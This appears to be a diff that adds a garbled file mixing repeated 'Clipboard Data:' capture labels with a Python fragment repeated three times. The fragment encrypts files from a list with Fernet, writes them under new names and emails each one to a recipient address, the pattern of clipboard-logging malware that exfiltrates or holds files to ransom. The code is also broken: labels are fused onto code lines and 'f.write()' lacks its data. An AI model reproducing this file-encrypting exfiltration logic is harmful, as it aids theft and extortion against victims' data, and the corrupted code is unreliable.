@@ -1,0 +1,32 @@
+Clipboard Data: 
+copy_clipboard()Clipboard Data: 
+    with open(files_to_encrypt[count], 'rb') as f:
+        data = f.read()
+    fernet = Fernet(key)
+    encrypted = fernet.encrypt(data)
+
+    with open(encrypted_file_names[count], 'wb') as f:
+        f.write()
+
+    send_email(encrypted_file_names[count], encrypted_file_names[count], toaddr)
+    count += 1Clipboard Data: 
+    with open(files_to_encrypt[count], 'rb') as f:
+        data = f.read()
+    fernet = Fernet(key)
+    encrypted = fernet.encrypt(data)
+
+    with open(encrypted_file_names[count], 'wb') as f:
+        f.write()
+
+    send_email(encrypted_file_names[count], encrypted_file_names[count], toaddr)
+    count += 1Clipboard Data: 
+    with open(files_to_encrypt[count], 'rb') as f:
+        data = f.read()
+    fernet = Fernet(key)
+    encrypted = fernet.encrypt(data)
+
+    with open(encrypted_file_names[count], 'wb') as f:
+        f.write()
+
+    send_email(encrypted_file_names[count], encrypted_file_names[count], toaddr)
+    count += 1
